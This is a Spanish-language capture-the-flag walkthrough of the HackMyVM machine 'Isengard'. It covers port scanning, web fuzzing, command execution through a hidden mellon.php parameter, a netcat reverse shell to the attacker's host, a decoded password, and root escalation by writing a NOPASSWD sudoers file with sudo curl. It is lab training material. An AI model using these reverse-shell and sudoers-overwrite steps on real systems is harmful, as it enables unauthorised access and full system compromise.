---
icon: flag
---

# Isengard HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 03:12 EDT
Nmap scan report for 192.168.5.35
Host is up (0.00073s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Gray wizard
MAC Address: 08:00:27:AA:BE:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
```

Veremos que solo hay un puerto `80` por lo que vamos a entrar dentro de dicho puerto, ya que aloja una pagina web, si entramos dentro veremos una pagina con un texto escrito pero que no nos interesa mucho, vamos a realizar un poco de `fuzzing` a ver que encontramos.

Si nos vamos al `main.css` en la pagina web y bajamos abajo del todo veremos lo siguiente:

```css
/* btw: in the robots.txt i have to put the url /y0ush4lln0tp4ss */
```

Vemos un comentario en `CSS` que parece ser la ruta de un directorio web, por lo que vamos a entrar a ver si existe.

```
URL = http://<IP>/y0ush4lln0tp4ss
```

Si inspeccionamos codigo veremos cosas pero ninguna interesante, por lo que vamos a realizar un poco de `fuzzing` web, a ver que nos encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/y0ush4lln0tp4ss/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.35/y0ush4lln0tp4ss/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 250]
/.html                (Status: 403) [Size: 277]
/east                 (Status: 200) [Size: 285]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
Progress: 249218 / 882244 (28.25%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 249498 / 882244 (28.28%)
===============================================================
Finished
===============================================================
```

Veremos que hay un directorio llamado `/east` el cual vamos a realizarle mas `fuzzing` de nuevo.

```shell
gobuster dir -u http://<IP>/y0ush4lln0tp4ss/east -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.35/y0ush4lln0tp4ss/east
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 285]
/.php                 (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/mellon.php           (Status: 200) [Size: 0]
Progress: 674786 / 882244 (76.49%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 674921 / 882244 (76.50%)
===============================================================
Finished
===============================================================
```

Veremos que nos ha encontrado un archivo `.php` el cual es bastante interesante, ya que solamente tenemos el puerto `80` y no hay `SSH` vamos a probar a ver si tuviera algun parametro vulnerable para un `RCE`.

## Escalate user www-data

### FFUF

```shell
ffuf -u 'http://<IP>/y0ush4lln0tp4ss/east/mellon.php?FUZZ=whoami' -w <WORDLIST> -fs 0
```

Info:

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.5.35/y0ush4lln0tp4ss/east/mellon.php?FUZZ=whoami
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

frodo                   [Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 203ms]
:: Progress: [20469/20469] :: Job [1/1] :: 1612 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

Veremos que hemos encontrado un parametro en el que se puede ejecutar codigo de forma remota `(RCE)`, por lo que vamos a entrar para verificarlo.

```
URL = http://<IP>/y0ush4lln0tp4ss/east/mellon.php?frodo=whoami
```

Info:

```
www-data
```

Vemos que funciona, por lo que vamos a realizar una `reverse shell` de esta forma:

```
URL = http://<IP>/y0ush4lln0tp4ss/east/mellon.php?frodo=nc -c sh <IP> <PORT>
```

Antes de enviarlo nos pondremos a la escucha.

```shell
nc -lvnp <IP>
```

Ahora si enviamos el anterior comando y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.35] 53132
whoami
www-data
```

Vemos que hemos obtenido una shell como el usuario `www-data` por lo que vamos a sanitizarla.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user sauron

Si listamos la carpeta de `/east` del directorio web, veremos lo siguiente:

```
total 84
drwxr-xr-x 2 root root  4096 Nov 11  2021 .
drwxr-xr-x 3 root root  4096 Nov 11  2021 ..
-rw-r--r-- 1 root root   285 Nov 11  2021 index.html
-rw-r--r-- 1 root root    47 Nov  2  2021 main.css
-rwxrwxrwx 1 root root    33 Nov 11  2021 mellon.php
-rw-r--r-- 1 root root    54 Nov 11  2021 oooREADMEooo
-rw-r--r-- 1 root root  6042 Nov 11  2021 ring.zip
-rw-r--r-- 1 root root 51658 Nov  2  2021 speakfriendandenter.jpg
```

Vemos que hay un archivo interesante llamado `ring.zip` y `oooREADMEooo` si leemos el segundo archivo veremos lo siguiente:

```
it is not easy to find the unique ring
keep searching
```

Nos esta diciendo que no hay solo un `ring` por lo que vamos a buscar el segundo.

```shell
find / -name "ring.*" 2>/dev/null
```

Info:

```
/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt/ring.zip
/var/www/html/y0ush4lln0tp4ss/east/ring.zip
```

Vemos que esta en una ruta super larga, por lo que vamos a irnos a la carpeta `/tmp` y vamos a moverlo a dicha carpeta de esta forma:

```shell
cd /tmp
mv /opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt/ring.zip .
```

Ahora vamos a descomprimirlo.

```shell
unzip ring.zip
```

Info:

```
Archive:  ring.zip
 extracting: ring.txt
```

Vemos que nos ha dado un `.txt` si lo leemos veremos lo siguiente:

```
ZVZoTFRYYzFkM0JUUVhKTU1rTk1XQW89Cg==
```

Vemos que esta codificado en `Base64` por lo que vamos a decodificarlo desde nuestro `host`:

```shell
echo 'ZVZoTFRYYzFkM0JUUVhKTU1rTk1XQW89Cg==' | base64 -d | base64 -d
```

Info:

```
yXKMw5wpSArL2CLX
```

Utilizo dos veces de decodificacion ya que esta dos veces codificado, vamos a probar a meter como contraseña del usuario `sauron` esa palabra.

```shell
su sauron
```

Metemos como contraseña `yXKMw5wpSArL2CLX` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMV{Y0uc4nN0tp4sS}
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for sauron on isengard:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sauron may run the following commands on isengard:
    (ALL) /usr/bin/curl
```

Veremos que podemos ejecutar el binario `curl` como el usuario `root`, por lo que podremos realizar esto.

```shell
cd /tmp
nano sauron

#Dentro del nano
sauron ALL=(ALL:ALL) NOPASSWD: ALL
```

Lo guardamos y haremos lo siguiente:

```shell
URL=file:///tmp/sauron
LFILE=/etc/sudoers.d/sauron
sudo curl $URL -o $LFILE
```

Info:

```
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    35  100    35    0     0  35000      0 --:--:-- --:--:-- --:--:-- 35000
```

Ahora si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for sauron on isengard:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sauron may run the following commands on isengard:
    (ALL) /usr/bin/curl
    (ALL : ALL) NOPASSWD: ALL
```

Vemos que ha funcionado, por lo que seremos `root` de esta forma.

```shell
sudo su
```

Info:

```
root@isengard:/tmp# whoami
root
```

Por lo que leeremos la `flag` del usuario `root`.

> root.txt

```
HMV{Y0uD3stR0y3dTh3r1nG}
```
